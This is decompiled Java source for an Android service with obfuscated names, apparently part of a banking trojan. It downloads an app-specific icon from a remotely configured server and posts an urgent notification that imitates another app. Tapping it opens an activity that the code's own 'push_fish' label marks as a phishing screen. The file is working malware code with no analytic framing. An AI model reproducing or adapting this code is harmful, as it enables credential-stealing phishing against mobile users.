package wocwvy.czyxoxmbauu.slsa;

import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.app.IntentService;
import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.AsyncTask;
import android.os.Build;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import wocwvy.czyxoxmbauu.slsa.ncec.ozkgyjpxtyxajmm;

/* JADX INFO: loaded from: classes.dex */
@SuppressLint({"NewApi"})
public class nepgaqmyfrhw extends IntentService {

    /* JADX INFO: renamed from: a */
    C0020b f480a;

    /* JADX INFO: renamed from: wocwvy.czyxoxmbauu.slsa.nepgaqmyfrhw$a */
    public class AsyncTaskC0045a extends AsyncTask<String, Void, Bitmap> {

        /* JADX INFO: renamed from: b */
        private Context f482b;

        /* JADX INFO: renamed from: c */
        private String f483c;

        /* JADX INFO: renamed from: d */
        private String f484d;

        /* JADX INFO: renamed from: e */
        private String f485e;

        /* JADX INFO: renamed from: f */
        private String f486f;

        public AsyncTaskC0045a(Context context, String str, String str2, String str3, String str4) {
            this.f482b = context;
            this.f483c = str;
            this.f484d = str2;
            this.f485e = str3;
            this.f486f = str4;
            nepgaqmyfrhw.this.f480a.m230a("PUSH", "2");
        }

        /* JADX INFO: Access modifiers changed from: protected */
        @Override // android.os.AsyncTask
        /* JADX INFO: renamed from: a, reason: merged with bridge method [inline-methods] */
        public Bitmap doInBackground(String... strArr) {
            nepgaqmyfrhw.this.f480a.m230a("PUSH", "3");
            try {
                HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(this.f485e).openConnection();
                httpURLConnection.setDoInput(true);
                httpURLConnection.connect();
                return BitmapFactory.decodeStream(httpURLConnection.getInputStream());
            } catch (MalformedURLException | IOException unused) {
                return null;
            }
        }

        /* JADX INFO: Access modifiers changed from: protected */
        @Override // android.os.AsyncTask
        @TargetApi(16)
        /* JADX INFO: renamed from: a, reason: merged with bridge method [inline-methods] */
        public void onPostExecute(Bitmap bitmap) {
            super.onPostExecute(bitmap);
            try {
                nepgaqmyfrhw.this.f480a.m250d(this.f482b, "str_push_fish", this.f486f);
                nepgaqmyfrhw.this.f480a.m230a("PUSH", "4 " + this.f486f);
                Intent intentAddFlags = new Intent(nepgaqmyfrhw.this, (Class<?>) ozkgyjpxtyxajmm.class).putExtra("str", this.f486f).addFlags(268435456).addFlags(8388608).addFlags(1073741824);
                if (Build.VERSION.SDK_INT <= 25) {
                    PendingIntent activity = PendingIntent.getActivity(this.f482b, 100, intentAddFlags, 1073741824);
                    NotificationManager notificationManager = (NotificationManager) this.f482b.getSystemService("notification");
                    Notification notificationBuild = new Notification.Builder(this.f482b).setContentIntent(activity).setContentTitle(this.f483c).setContentText(this.f484d).setVibrate(new long[]{1000, 1000, 1000, 1000, 1000}).setPriority(1).setDefaults(2).setDefaults(1).setDefaults(4).setSmallIcon(R.drawable.im).setLargeIcon(bitmap).build();
                    notificationBuild.flags |= 16;
                    notificationManager.notify(1, notificationBuild);
                    return;
                }
                nepgaqmyfrhw.this.f480a.m230a("Notification", "Title: " + this.f483c + " Text: " + this.f484d);
                C0020b c0020b = nepgaqmyfrhw.this.f480a;
                C0020b.m217a(this.f482b, intentAddFlags, bitmap, this.f483c, this.f484d);
            } catch (Exception unused) {
                nepgaqmyfrhw.this.f480a.m230a("ERROR", "nepgaqmyfrhw -> PUSH 4");
            }
        }
    }

    public nepgaqmyfrhw() {
        super("");
        this.f480a = new C0020b();
    }

    @Override // android.app.IntentService
    protected void onHandleIntent(Intent intent) {
        String stringExtra = intent.getStringExtra("appname");
        String stringExtra2 = intent.getStringExtra("title");
        String stringExtra3 = intent.getStringExtra("text");
        String strM251e = this.f480a.m251e(this, "url");
        this.f480a.m230a("PUSH", "1: " + strM251e + "/icon/" + stringExtra + ".png");
        StringBuilder sb = new StringBuilder();
        sb.append(strM251e);
        sb.append("/icon/");
        sb.append(stringExtra);
        sb.append(".png");
        new AsyncTaskC0045a(this, stringExtra2, stringExtra3, sb.toString(), stringExtra).execute(new String[0]);
    }
}
